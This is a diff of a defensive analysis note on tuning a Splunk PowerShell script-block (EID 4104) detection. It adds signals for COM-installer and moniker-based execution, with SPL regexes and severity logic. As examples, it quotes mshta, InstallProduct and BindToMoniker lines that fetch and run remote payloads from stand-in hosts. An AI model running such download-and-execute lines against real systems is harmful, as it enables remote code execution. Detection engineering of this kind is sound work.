@@ -1,35 +1,84 @@
-# Analysis | T1059.001 WinEvent EID 4104 | splunk detection tuning
+# Analysis | T1059.001 WinEvent EID 4104 | Splunk Detection Tuning
 
 ## Scope
 
-This analysis covers the value of adding the decided fields to In memory & obfuscation mechanism checks in the .spl alert.
-The added values being matched are:
-A blindspot to execution via URL links, the following command would raise as informational in the original splunk detection:
+This analysis covers the gaps identified in the in-memory and execution mechanism checks of the EID 4104 SPL detection, and the reasoning behind adding `hasAltExec` and `hasRemote` as new evaluation signals.
+
+### EID 4104 Boundary
+
+EID 4104 logs what the PowerShell engine compiles and runs — not what cmd.exe or other interpreters do independently. A command like:
+
 ```powershell
-C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('https://evil.example/payload.sct').Exec();close()"
 ```
 
-Obviously theres a caveat that im building for T1059.001, sysmon 1 & win event 4104 only catch what executes inside a powershell shell and as such we'd only catch this specific entity 'cmd.exe' launching mshta.exe if its executed via PS which can be worked around within PS or by using cmd itself to launch the command, so instead Im focusing on catching the entity specifically and cutting the head of the snake in pyrmaid of pain speak (attacking the underlying mechanism not a specific entity), the attacker needs to run GetObject followed by a url, or script etc, I will use the following to catch this:
-| eval hasScriptlet = if(match(ScriptBlockText, "(?i)(GetObject\s*\(\s*['\"](script|scriptlet):|\bmshta\b)"), 1, 0)
-Can add that to in memory
+...is only visible in 4104 if it was invoked from inside a PS script block. Catching the specific `cmd.exe → mshta.exe` parent image chain is a Sysmon EID 1 problem, not a 4104 problem I am choosing not to tune towards accounting for parent images.
 
-Could potentially add some of the following to osbfuc, need more researhc done,
-.Insert( ->Modify strings/collections  (Obfuscation)
-UILevel -> Control install UI visibility (Silent execution)
-Attacker can do uilevel = 2 to reduce GUI visbility for user/ alerts etc.
+The approach here is to catch the PS-native equivalents: `BindToMoniker` (the PS equivalent of VBScript `GetObject`) and `mshta` when called directly inside a PS script block. These appear in 4104 regardless of the parent process chain, and they survive `-EncodedCommand` because the engine must decode the block before running it.
 
+---
+
+## Identified Gaps
+
+### Gap 1 — COM-Based Execution Without IEX
+
+V1 catches download + IEX together (High) and either alone (Medium). A COM-based download-and-execute that doesn't use a recognised fetch keyword or `IEX` scores nothing:
+
+```powershell
 $installer = New-Object -ComObject WindowsInstaller.Installer
-Thinking of addding this one too, obviouslyt these 3 may need their own section and graded as informational if they appear own their own kind of thing, but if multiple show then they can grade like the rest of the alert, move up to medium/ high
+$installer.InstallProduct("https://malicious.example/payload.msi", "ACTION=INSTALL")
+```
 
-Can use this to prove installation occured:
-$installer.InstallProduct("C:\malicious.msi", "ACTION=INSTALL")
+ART Test 6 confirmed this: `MsXml2.ServerXmlHttp` scored zero, only the `IEX` call on the response triggered Medium. An attacker omitting `IEX` and executing via `.ResponseText` assignment or a compiled method call would produce no alert.
 
+### Gap 2 — Moniker Binding / Scriptlet Execution
 
+`BindToMoniker` can load and execute a remote scriptlet entirely inside a PS script block with no child process spawn:
+
+```powershell
+[System.Runtime.InteropServices.Marshal]::BindToMoniker("script:https://evil.example/payload.sct")
+```
+
+This runs fully in memory, spawns nothing visible to EID 1, and was not in the V1 keyword list. It is the PS-native equivalent of what VBScript `GetObject` does, but lives in 4104 telemetry rather than wscript/cscript.
+
+---
+
+## Decision: hasAltExec + hasRemote
+
+Two new signals were added to close both gaps:
+
+**`hasAltExec`** — COM installer and moniker binding primitives:
+```spl
+| eval hasAltExec = if(match(ScriptBlockText, "(?i)(WindowsInstaller\.Installer|\.InstallProduct\s*\(|BindToMoniker|\bmshta\b)"), 1, 0)
+```
+
+**`hasRemote`** — URL presence as a pairing condition:
+```spl
+| eval hasRemote = if(match(ScriptBlockText, "(?i)(https?://|ftp://)"), 1, 0)
+```
+
+Severity mapping:
+- `anyAltExec=1` alone → Medium
+- `anyAltExec=1 AND anyRemote=1` → High (remote COM/LOLBin download-and-execute)
+
+`hasRemote` is not a standalone detection — scripts referencing URLs are common and benign. The signal only matters when paired with `hasAltExec`.
+
+---
 
 ## Key Finding
 
-The detections for osbfucation is currently limited, same for in memory techniques, adding a couple could significantly improve this problem, that said the main issue i found was related to .com object downloads in combo with obsufc techniques, these dont get detected currently.
-Second to that using scriptlet moniker seems to slip through, a threat actor could poetntially run a java script/ JSE etc and it wouldnt be detected. The reason why I want to cover this in 4104 is it can be executed in memory completely & can be done without spawning procceses etc if need be, it could be done via PS script block i need to catch it.
+The primary gap was COM-based download-and-execute: the V1 detection only scores `IEX`, so the alert fires at Medium (or not at all) when it should fire High. The secondary gap was scriptlet moniker binding — a fully in-memory execution path with no process spawn.
+
+Both are addressed by the `hasAltExec` signal. The `hasRemote` pairing condition is what distinguishes a legitimate `BindToMoniker` usage from a remote code execution attempt.
+
+---
+
 ## Risk of the Filter
 
-The accepted risk: That the COM block check increases FP subtly, however I've worked around this by using conditions to only raise an alert if there is multiple filters triggered.
+Accepted risk: `hasAltExec` increases FPs slightly because `mshta` and `BindToMoniker` appear in some legitimate administrative PS scripts.
+
+Mitigations applied:
+1. `anyAltExec` alone stays at Medium — it does not reach High without `anyRemote`.
+2. `BindToMoniker` without a URL in the same execution bucket never escalates.
+
+Residual scenario: an admin script that invokes `mshta` and references an internal URL in the same 10-minute bucket could reach High. Acceptable in a lab; reassess against environment baseline before promoting to production.
